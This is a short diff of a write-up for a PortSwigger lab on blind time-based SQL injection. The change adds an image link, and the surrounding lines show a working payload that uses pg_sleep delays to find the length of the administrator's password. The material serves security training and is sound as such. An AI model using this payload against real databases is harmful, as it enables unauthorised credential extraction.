@@ -60,7 +60,7 @@ The below payload checks if the length is > 1.
 ';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
 ```
 
-![image]()
+![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/d7bc2b7f26728851b6f4f9465d259600b9eca741/SQL-Injection/Lab%3A%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval/Images/Find%20Length%20of%20Admin%20Password.png)
 
 
 It takes 10 sec delay to respond which means it is > 1 character.
